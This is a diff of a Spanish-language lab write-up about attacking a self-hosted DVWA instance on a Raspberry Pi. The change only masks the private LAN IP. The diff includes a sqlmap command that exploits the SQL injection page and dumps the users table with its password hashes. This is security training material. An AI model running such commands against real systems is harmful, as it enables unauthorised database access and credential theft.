@@ -23,7 +23,7 @@ c6fc7a9fba89   pihole/pihole:latest            Up 22 hours    0.0.0.0:53->53, 80
 
 - **Front:** Apache 2.4.68 + PHP 8.5.11 (contenedor `dvwa`)
 - **Base de datos:** MariaDB 10 (contenedor `dvwa-db`)
-- **URL del reto:** `http://10.0.0.62:8080/vulnerabilities/sqli/` (la IP de mi Pi en la LAN)
+- **URL del reto:** `http://10.0.0.X:8080/vulnerabilities/sqli/` (IP privada de mi Pi en la LAN)
 
 ---
 
@@ -73,7 +73,7 @@ Con eso ya se saca la lista de usuarios y sus hashes. Luego lo confirmé y autom
 Lanzo sqlmap contra el parámetro `id`, pasándole mi cookie de sesión y apuntando directo a la tabla `users` de la base `dvwa`:
 
 ```bash
-sqlmap -u "http://10.0.0.62:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://10.0.0.X:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<tu-cookie-de-sesión>; security=low" \
   --batch -D dvwa -T users --dump
 ```
